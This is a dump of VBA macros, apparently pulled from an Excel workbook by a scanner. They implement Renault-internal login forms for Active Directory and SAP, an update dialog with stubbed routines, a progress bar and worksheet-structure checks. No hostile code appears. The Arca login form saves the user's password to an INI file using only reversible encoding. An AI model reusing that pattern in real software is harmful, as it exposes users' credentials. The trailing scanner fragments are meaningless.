Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       : DTSI - RS|fffd| - RS|fffd| Minute - Sce 50517
'[Date cr|fffd|ation : 15/09/2005
'[Version       : V1.0 du 15/09/2005
'[---------------------------------------------------------------------------
'[Sujet: Authentification Arca
'[---------------------------------------------------------------------------

Option Explicit


Private Sub UserForm_Initialize()
    Dim SaveLogin As String
    Dim Login As String
    Dim Psw As String
    
    Me.StartUpPosition = 2 'CenterScreen
    
    Me.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgConArca")
    
    Me.lblMsg.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgConArca")
    Me.lblLogin = IniCls.ReadStringIniLangage("MsgFWK", "MsgIpn") & " :"
    Me.lblPsw = IniCls.ReadStringIniLangage("MsgFWK", "MsgPsw") & " :"
    Me.chkSaveLogin = IniCls.ReadStringIniLangage("MsgFWK", "MsgSaveLogin")
    Me.btnOk.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgOk")
    Me.btnCancel.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgCancel")
    
    'Initialisation Ipn et Mot de Passe
    IniCls.ReadStringIniMain "Login", "SaveLogin", SaveLogin
    If CBool(SaveLogin) Then
        chkSaveLogin = True
        IniCls.ReadStringIniMain "Login", "Login", Login
        IniCls.ReadStringIniMain "Login", "Psw", Psw
        
        txtIpn.Value = CryptCls.Decode(Login)
        txtPsw.Value = CryptCls.Decode(Psw)
    Else
        chkSaveLogin = False
        txtIpn.Value = vbNullString
        txtPsw.Value = vbNullString
    End If
    
    txtIpn.SetFocus
End Sub


Private Sub btnCancel_Click()
    txtIpn.Value = vbNullString
    txtPsw.Value = vbNullString
    Unload Me
    'End
End Sub


Private Sub UserForm_QueryClose(Cancel As Integer, closemode As Integer)
    txtIpn.Value = vbNullString
    txtPsw.Value = vbNullString
    Unload Me
    'End
End Sub


Private Sub btnOk_Click()
        Dim MyRoles As Variant 'Les Roles Utilisateurs, class|fffd|s par ordre de priorit|fffd|, les droits les plus |fffd|lev|fffd|s en premier
 
    If txtIpn = vbNullString Then
        txtIpn.SetFocus
    ElseIf txtPsw = vbNullString Then
        txtPsw.SetFocus
    Else
        If chkSaveLogin Then
            IniCls.WriteStringIniMain "Login", "SaveLogin", "TRUE"
        Else
            IniCls.WriteStringIniMain "Login", "SaveLogin", "FALSE"
        End If
        
        If SystemCls.Connecte_Reseau_Renault Then
            If ArcaCls.Authentification_Active_Directory(txtIpn.Value, txtPsw.Value) Then
                IniCls.WriteStringIniMain "Login", "Login", CryptCls.Encode(txtIpn.Value)
                IniCls.WriteStringIniMain "Login", "Psw", CryptCls.Encode(txtPsw.Value)
                
                'Message_Winsock
                If ArcaCls.Extraction_Info_Ldap(txtIpn.Value) Then
                    IniCls.WriteStringIniMain "Login", "Username", CryptCls.Encode(ArcaCls.CurrentUser)
                    'If Gest_Role Then
                    '    MyRoles = Roles_Applicatif
                    '    If ArcaCls.Test_Role_Ldap(txtIpn.Value, MyRoles) Then
                    '        'MsgBox "Ok"
                    '    Else
                    '        Unload Me
                    '        MsgCls.ShowMessage "MsgNoRole", vbCrLf & vbCrLf, "MsgContact", vbnullstring, vbOKOnly + vbCritical
                    '    End If
                    'End If
                End If

                PageAccueil.ShowWelcome True 'Affichage de la page d'accueil
                PageAccueil.ShowMainMenu False, True
            Else
                Beep
                Me.lblMsg.ForeColor = RGB(255, 0, 0)
                Me.lblMsg.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgVerify")
                Exit Sub
            End If
        Else 'Non Connect|fffd|
            Unload Me
            IniCls.WriteStringIniMain "Login", "Role", vbNullString
            MsgCls.ShowMessage "MsgNoReseau", vbCrLf & vbCrLf, vbNullString, vbNullString, vbOKOnly + vbCritical
        End If
                 
        Unload Me
    End If
End Sub
Attribute VB_Name = "frmLoginSAP"
Attribute VB_Base = "0{514961DA-D166-42BD-B681-48C31D8B7518}{DA3C40B7-8735-4A77-B90D-465E0726170A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Public bLogOk As Boolean


Private Sub bTAnnuler_Click()
    Me.bLogOk = False
    Me.Hide
End Sub

Private Sub bTOK_Click()
    Dim i As Integer, j As Integer

    If txtUser = vbNullString Then
        MsgBox "Le nom d'utiliateur est obligatoire !", vbExclamation
        Exit Sub
    End If
    If txtPass = vbNullString Then
        MsgBox "Le mot de passe est obligatoire !", vbExclamation
        Exit Sub
    End If
    If oProd.Value = True Then
        i = 6
        j = 0
        sEnv = "ProdSimon"
    ElseIf oProdRACINE = True Then
        i = 6
        j = 6
        sEnv = "ProdRacine"
    ElseIf oRE7.Value = True Then
        i = 5
        j = 0
        sEnv = "RE7Simon"
    ElseIf oRE7RACINE.Value = True Then
        i = 5
        j = 6
        sEnv = "RE7Racine"
    Else
        MsgBox "La s|fffd|lection d'un environnement est obligatoire !", vbExclamation
        Exit Sub
    End If
    
    sAppServer = Sheets(shParam_FID).Cells(j + 1, i)
    sSystem = Sheets(shParam_FID).Cells(j + 2, i)
    sSystNumber = Sheets(shParam_FID).Cells(j + 3, i)
    sClient = Sheets(shParam_FID).Cells(j + 4, i)
    sUser = txtUser
    sPassword = txtPass
    sLanguage = Sheets(shParam_FID).Cells(j + 5, i)
    
    Set oBapiCtrl = CreateObject("SAP.Functions")
    oBapiCtrl.Connection.ApplicationServer = sAppServer
    oBapiCtrl.Connection.System = sSystem
    oBapiCtrl.Connection.systemnumber = sSystNumber
    oBapiCtrl.Connection.Client = sClient
    oBapiCtrl.Connection.user = txtUser
    oBapiCtrl.Connection.Language = sLanguage
    oBapiCtrl.Connection.Password = txtPass
    oBapiCtrl.Connection.Logon 0, True

    If Not oBapiCtrl.Connection.IsConnected = 1 Then
        MsgBox "Probl|fffd|me de connexion |fffd| SAP ! V|fffd|rifiez votre nom d'utilisateur et/ou votre mot de passe."
        Set oBapiCtrl = Nothing
    Else
        Me.bLogOk = True
        Me.Hide
        'on enregistre dans la base de registre pour la prochaine fois
        SaveSetting "SimonGed", "Connexion", "User", sUser
        SaveSetting "SimonGed", "Connexion", "Env", sEnv
    End If

End Sub

Private Sub UserForm_Activate()
    Dim sEnv As String
    Me.bLogOk = False
    txtUser.Value = GetSetting("SimonGed", "Connexion", "User")
    sEnv = GetSetting("SimonGed", "Connexion", "Env")
    
    If sEnv = "ProdSimon" Then
        oProd.Value = True
    ElseIf sEnv = "ProdRacine" Then
        oProdRACINE.Value = True
    ElseIf sEnv = "RE7Simon" Then
        oRE7.Value = True
    ElseIf sEnv = "RE7Racine" Then
        oRE7RACINE.Value = True
    End If
End Sub
Attribute VB_Name = "frmMiseAJour"
Attribute VB_Base = "0{DF841337-FC6B-4298-96B6-CCEF75547273}{B0BED422-6C21-445B-818F-FE766BC446EC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Formulaire de mise |fffd| jour version Application
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 30/09/2008
'[Version       : V1.0 du 30/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Formulaire de mise |fffd| jour version Application
'[---------------------------------------------------------------------------

Private Sub UserForm_Initialize()
    Me.StartUpPosition = 2 'CenterScreen
    
    Me.Caption = APP_TITLE & " - V" & APP_VERSION
    Me.btnMiseAJour.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgMiseAJour")
    Me.btnCancel.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgCancel")
    Me.chkProposer.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgTestMaj")
End Sub


Private Sub btnCancel_Click()
    Telecharger_Mise_A_Jour False
    Unload Me
End Sub


Private Sub btnMiseAJour_Click()
    Telecharger_Mise_A_Jour True
    Unload Me
End Sub
Attribute VB_Name = "frmProgression"
Attribute VB_Base = "0{33BE184D-03B7-4D96-9C79-CC3955DC0B0A}{1A0DAC8F-6861-476C-8EF2-7C479C911B97}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       : DTSI - RS|fffd| - RS|fffd| Minute - Sce 50517
'[Date cr|fffd|ation : 11/05/2005
'[Version       : V1.4 du 19/01/2009
'[---------------------------------------------------------------------------
'[Sujet: Initialisation et Gestion de la Form Progression des Traitements
'[---------------------------------------------------------------------------


Public FlagAbandon  As Integer
Private StartTime   As Date
Private RefreshTime As Date

'Pour r|fffd|cup|fffd|rer le handle de l'Userform
Private Declare Function FindWindowA Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Private Sub UserForm_Initialize()
    With Me
        .Caption = APP_TITLE & " - V" & APP_VERSION
        .StartUpPosition = 2  'CenterScreen
        .FrameProgress.Width = 0 '0%
        .cmdOKCancel.Default = True
        .cmdOKCancel.Cancel = True
    End With
    SetStartTime
    'RefreshAuto
    
    Transparence 90           '100 opaque et 0 on ne voit pas la boite
End Sub

Private Sub UserForm_Activate()
    FlagAbandon = 0
    
    Me.FrameProgress.Width = 0
    Me.lblTraitement.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours")
    
    If Me.lblN|fffd|Traitement = 1 Then
        Analyse_Format_Data
    ElseIf Me.lblN|fffd|Traitement = 2 Then
        Stop 'Analyse_Formats_Et_Liens
    ElseIf Me.lblN|fffd|Traitement = 3 Then
        Analyse_Pieces_Rechange
    ElseIf Me.lblN|fffd|Traitement = 4 Then
        Mise_en_Forme
    ElseIf Me.lblN|fffd|Traitement = 5 Then
        Import_TDI
    ElseIf Me.lblN|fffd|Traitement = 6 Then
        Verification_Documentaire
    ElseIf Me.lblN|fffd|Traitement = 7 Then
        Import_SAP_SIMON
    ElseIf Me.lblN|fffd|Traitement = 8 Then
        Import_Pdr
    End If
    
    Transparence 100 '100 opaque et 0 on ne voit pas la boite
    
    'StopRefresh
    If FlagAbandon = 0 Then
        Me.lblTraitement.Caption = Me.lblTraitement.Caption
    ElseIf FlagAbandon = 1 Then
        Me.lblTraitement.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgAbandon") & vbCrLf & GetPastTime
    End If
    
    'Me.frameProgression.Visible = False
    
    'Pour afficher la boite de Dialogue, Traitement Termin|fffd|
    With Me.cmdOKCancel
        .Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgFin")
        '.Accelerator = "F"
    End With
    'ou Unload Me pour effacer la bo|fffd|te de dialogue
End Sub


Sub UpdateProgress(PourcentageEffectue As Single, Traitement As String, Abandon As Integer)
    With frmProgression
        .lblTraitement.Caption = Traitement & vbCrLf & GetPastTime
        .FrameProgress.Caption = VBA.Format(PourcentageEffectue, "0 %")
        .FrameProgress.Width = PourcentageEffectue * (.frameProgression.Width)
        .Repaint
        FlagAbandon = Abandon
    End With
    DoEvents
End Sub


Private Sub cmdOKCancel_Click()
    FlagAbandon = 1
    If cmdOKCancel.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgFin") Then Unload Me
End Sub


Private Sub Transparence(Valeur As Long)
    Dim MeHwnd As Long
    MeHwnd = FindWindowA(vbNullString, Me.Caption)
    'Valeur, correspond au pourcentage de transparence, 100 opaque et 0 on ne voit rien
    Call FormCls.Transparence(MeHwnd, Valeur)
End Sub


Private Sub SetStartTime()
    StartTime = VBA.Now '"22/05/2006 23:25:59"
End Sub


Private Function GetPastTime() As String
    If FlagAbandon Then GetPastTime = ", Fin : " & VBA.Format(Now, "hh:mm:ss") Else GetPastTime = vbNullString                     ', Heure Actelle : " & vba.format(Now, "hh:mm:ss")
    
    GetPastTime = "Heure de D|fffd|but : " & VBA.Format(StartTime, "hh:mm:ss") & GetPastTime & ", Temps Pass|fffd| : " & VBA.Format(Now - StartTime, "hh:mm:ss")
End Function


'Private Sub RefreshAuto()
'    'Programmation de l'|fffd|v|fffd|nement toutes les 60 secondes
'    RefreshTime = Now + TimeValue("00:00:05")
'    Application.OnTime RefreshTime, "RefreshProgress"
'End Sub
'
'
'Private Sub StopRefresh()
'    On Error Resume Next
'    'Stoppe la gestion de l'|fffd|v|fffd|nement OnTime
'    Application.OnTime RefreshTime, "RefreshProgress", , False
'    On Error GoTo 0
'End Sub

'Public Sub RefreshProgress()
'    frmProgression.Repaint
'End Sub
Attribute VB_Name = "shtLocalization"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ssen"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "vb_Mise_A_Jour"
'Attribute VB_Name = "vb_Mise_A_Jour"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Requete HTTP sur Base IG
'[Auteur        : Alain CHERMAT
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 19/12/2007
'[Version       : V1.3 du 10/06/2009
'[---------------------------------------------------------------------------
'[Sujet: Requete HTTP sur Base IG
'[---------------------------------------------------------------------------


Const UrlWeb = "http://notope58.renault.fr/ig/25/pmaint.nsf/(Tech-Fichiers)/"
Const IdPage = "51693FFE5F3E439CC1256FF1004621E7"
Dim Abandon As Boolean


Function Nouvelle_Version_Serveur(Signature As String) As Boolean
End Function


Sub Verification_Mise_A_Jour()

End Sub
 
 
Sub Telecharger_Mise_A_Jour(Download As Boolean)

End Sub


Function Load_Version_Serveur(Signature As String)
End Function


Function Load_Data(WsData As Worksheet)
End Function


Function ResoudHyperLien(Link As String)

'Supprimer tous les noms (avec un joker) dans une feuille de calcul.
End Function


Attribute VB_Name = "vb_Structure"
'[---------------------------------------------------------------------------
'[Identifiant   : Routines li|fffd|es |fffd| la structure du TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 15/07/2008
'[Version       : V1.4 du 24/02/2009
'[---------------------------------------------------------------------------
'[Sujet: Routines li|fffd|es |fffd| la structure du TDI
'[---------------------------------------------------------------------------

Option Explicit


Function Feuilles_Du_TDI() As Variant
    Feuilles_Du_TDI = Array(shWelcome, shCde_Bienvenue, shCde_Nomenclature, shCde_Simon, shCde_Document, shTable_Fonction_Process, _
        shDico, shTraduction, ShAffaire, shDecoupage, shMateriels, shDocuments, shPieces_Rechange, shCtrl_Ged, shCSV, shEquipmt, _
        shSsEnsemble, shArticles, shPt, shGE_ACreer, shGE_AModifier, shENS_ACreer, shENS_AModifier, shENS_ASupprimer, _
        shtLangue)
End Function


Function Feuilles_Par_Defaut() As Variant
    Feuilles_Par_Defaut = Array(shWelcome, ShAffaire, shDecoupage, shMateriels, shDocuments, shPieces_Rechange, shTable_Fonction_Process)
End Function


Function Verifie_Structure_TDI()
    Dim LstFeuille    As Variant
    Dim sh            As Variant
    Dim Structure_TDI As Boolean

    Structure_TDI = True
    LstFeuille = Feuilles_Du_TDI
    For Each sh In LstFeuille
        If Not SheetCls.Sheet_Exist(ThisWorkbook, sh) Then
            Structure_TDI = False
            MsgCls.ShowMessage "MsgDefautStructure", vbCrLf & vbCrLf & "Onglet '" & sh & "' Non Trouv|fffd| !", vbNullString, vbNullString, vbOKOnly + vbCritical
        End If
    Next
    If Not Structure_TDI Then End
End Function


Function Verifie_Structure_Import(wB As Workbook) As Boolean
    Dim Structure_TDI As Boolean
    
    Structure_TDI = True
    If Not SheetCls.Sheet_Exist(wB, ShAffaire) Then
        Structure_TDI = False
    ElseIf Not SheetCls.Sheet_Exist(wB, shDecoupage) And Not SheetCls.Sheet_Exist(wB, shOldDecoupage) Then
        Structure_TDI = False
    ElseIf Not SheetCls.Sheet_Exist(wB, shMateriels) And Not SheetCls.Sheet_Exist(wB, shOldMateriels) Then
        Structure_TDI = False
    ElseIf Not SheetCls.Sheet_Exist(wB, shDocuments) Then
        Structure_TDI = False
    End If
    Verifie_Structure_Import = Structure_TDI
End Function


Sub Purge_Data(sh As String)
    Dim LigneDeb   As Long
    With ThisWorkbook.Worksheets(sh)
        .Visible = True
        .Activate
        ActiveWindow.FreezePanes = False
        ActiveWindow.SplitRow = 0
        
        If .AutoFilterMode Then
            On Error Resume Next
            .ShowAllData
            On Error GoTo 0
        End If

        If sh = shCtrl_Ged Then
            .Cells.Clear
        Else
            LigneDeb = FirstLine(sh)
            .Rows(LigneDeb & ":" & .Rows.Count).ClearComments
            .Rows(LigneDeb & ":" & .Rows.Count).Delete
            .Rows(LigneDeb & ":" & .Rows.Count).NumberFormat = "@"
            
            ActiveWindow.ScrollRow = 1
            .Range("A" & LigneDeb).Select
            ActiveWindow.SplitRow = LigneDeb - 1
            ActiveWindow.FreezePanes = True
        End If
    End With
End Sub


Function Nom_Feuille_Import(wB As Workbook, shName) As String
    If shName = shDecoupage Then
        If SheetCls.Sheet_Exist(wB, shOldDecoupage) Then Nom_Feuille_Import = shOldDecoupage Else Nom_Feuille_Import = shDecoupage
    ElseIf shName = shMateriels Then
        If SheetCls.Sheet_Exist(wB, shOldMateriels) Then Nom_Feuille_Import = shOldMateriels Else Nom_Feuille_Import = shMateriels
    Else
        Stop
    End If
End Function


Function Lastline(wS As Worksheet) As Long
    Dim Ligne As Long, lLast As Long
    
    Ligne = 0
    On Error GoTo Pb_Nommage
    If wS.Name = shMateriels Then
            Ligne = SheetCls.LastLineColumn(wS, wS.Range("MatNumeroOrdre").Column) 'Num|fffd|ro d'ordre
            If SheetCls.LastLineColumn(wS, wS.Range("MatRefFournisseur").Column) > Ligne Then Ligne = SheetCls.LastLineColumn(wS, wS.Range("MatRefFournisseur").Column)                 'R|fffd|f|fffd|rence du Mat|fffd|riel
    ElseIf wS.Name = shDecoupage Then
            Ligne = SheetCls.LastLineColumn(wS, wS.Range("DecNumeroOrdre").Column) 'Num|fffd|ro d'ordre
            If SheetCls.LastLineColumn(wS, wS.Range("DecNum_SSEN").Column) > Ligne Then Ligne = SheetCls.LastLineColumn(wS, wS.Range("DecNum_SSEN").Column)                'R|fffd|f|fffd|rence Fournisseur
    ElseIf wS.Name = shDocuments Then
            Ligne = SheetCls.LastLineColumn(wS, wS.Range("DocNumeroOrdre").Column) 'Num|fffd|ro d'ordre
            If SheetCls.LastLineColumn(wS, wS.Range("DocRefDocument").Column) > Ligne Then Ligne = SheetCls.LastLineColumn(wS, wS.Range("DocRefDocument").Column)                 'R|fffd|f|fffd|rence Document
    ElseIf wS.Name = shCtrl_Ged Then
            Ligne = SheetCls.LastLineColumn(wS, 1) 'Colonne Dossier
    ElseIf wS.Name = shPieces_Rechange Then
            Ligne = SheetCls.LastLineColumn(wS, wS.Range("PrNumeroOrdre").Column) 'Num|fffd|ro d'ordre
            If SheetCls.LastLineColumn(wS, wS.Range("PrRefFournisseur").Column) > Ligne Then Ligne = SheetCls.LastLineColumn(wS, wS.Range("PrRefFournisseur").Column)                 'R|fffd|f|fffd|rence Fournisseur
    End If
    
Pb_Nommage:
    On Error Resume Next

    'Pour |fffd|viter Erreur 91 sur feuille Vierge
    If wS.Range("A1").Value = vbNullString Then wS.Range("A1").Value = "ACH"
    lLast = wS.Cells.Find(what:="*", after:=wS.Range("A1"), SearchOrder:=xlByRows, SearchDirection:=xlPrevious).row
    If lLast > Ligne Then Ligne = lLast
    If wS.Range("A1").Value = "ACH" Then wS.Range("A1").Value = vbNullString
    
    On Error GoTo 0
    
    Lastline = Ligne
End Function


Function FirstLine(sh As String) As Long
    Dim Ligne   As Long
    Dim wS      As Worksheet
    
    Set wS = ThisWorkbook.Worksheets(sh)
    If sh = shMateriels Then
        Ligne = wS.Range("MatLigneEntete").row + 2
    ElseIf sh = shDecoupage Then
        Ligne = wS.Range("DecLigneEntete").row + 2
    ElseIf sh = shDocuments Then
        Ligne = wS.Range("DocLigneEntete").row + 2
    ElseIf sh = shPieces_Rechange Then
        Ligne = wS.Range("PRLigneEntete").row + 4
    ElseIf sh = shCtrl_Ged Then
        Ligne = 10
    ElseIf sh = shCSV Then
        Ligne = 2
    ElseIf sh = shListeDeFID Then
        Ligne = 5
    ElseIf sh = shListe_FID Then
        Ligne = 2
    ElseIf sh = shListe_Originaux Then
        Ligne = 2
    Else
        Stop
    End If
    
    FirstLine = Ligne
End Function


Sub Controle_Zones_Nommees_TDI()
    Dim Champ As Range
    Dim Plage As Range
    
    Set Plage = ThisWorkbook.Worksheets("Structure").Range("DecName")
    For Each Champ In Plage
        If Not SheetCls.Zone_Nommee_Existe(ThisWorkbook.Worksheets(shDecoupage), Champ.Value) Then Stop
    Next

    Set Plage = ThisWorkbook.Worksheets("Structure").Range("MatName")
    For Each Champ In Plage
        If Not SheetCls.Zone_Nommee_Existe(ThisWorkbook.Worksheets(shMateriels), Champ.Value) Then Stop
    Next

    Set Plage = ThisWorkbook.Worksheets("Structure").Range("DocName")
    For Each Champ In Plage
        If Not SheetCls.Zone_Nommee_Existe(ThisWorkbook.Worksheets(shDocuments), Champ.Value) Then Stop
    Next
    
    Set Plage = ThisWorkbook.Worksheets("Structure").Range("PrName")
    For Each Champ In Plage
        If Not SheetCls.Zone_Nommee_Existe(ThisWorkbook.Worksheets(shPieces_Rechange), Champ.Value) Then Stop
    Next

    MsgBox "Ok"

End Sub

' InQuest injected base64 decoded content
' wMjg
' wMjg
' .('z

INQUEST-PP=macro
